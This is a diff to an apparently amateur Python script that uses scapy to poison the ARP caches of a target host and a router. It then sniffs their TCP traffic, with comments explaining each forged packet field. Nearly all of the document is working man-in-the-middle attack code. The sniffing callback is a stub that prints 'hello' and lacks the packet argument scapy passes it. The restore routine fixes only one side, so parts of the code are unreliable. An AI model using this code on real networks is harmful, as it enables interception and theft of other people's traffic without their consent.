@@ -6,12 +6,20 @@ import sys
 import os
 import re
 
-def runSpoof(args):
-	spoof(args.IP_target, args.MAC_target, args.IP_src)
-	spoof(args.IP_src, args.MAC_src, args.IP_target)
+def restore(destination_ip, source_ip, destination_mac, source_mac):
+	packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+	scapy.send(packet, verbose = False)
+
+def handlePackets():
+	print("hello")
+
+def poison(args):
+	spoof(args.IP_target, args.MAC_target, args.IP_src) # Tells the target (his IP and MAC address) that my MAC address is linked to the router's IP
+	spoof(args.IP_src, args.MAC_src, args.IP_target) # Tells the router // that my MAC address is linked to the target
+	scapy.sniff(iface="eth0", prn=handlePackets, filter="tcp") # Analyses traffic (Here specifically on TCP using the handlePackets() function)
 
 def spoof(target_ip, target_mac, spoof_ip): 
-	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
+	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip) # op stands for response (meaning the packet created is a response to a query), pdst = IP destination, hwdst = HardWare (MAC address) destination, psrc = IP source...
 	scapy.send(packet, verbose = False)
 
 def isValidMacAddress(mac):
@@ -41,6 +49,7 @@ def main() :
 	except Exception as e:
 		print(f"Error: {e}")
 	except KeyboardInterrupt:
+		restore(args.IP_target, args.IP_src, args.MAC_target, args.MAC_src)
 		print("Process interrupted. Exiting Gracefully...")
 
 
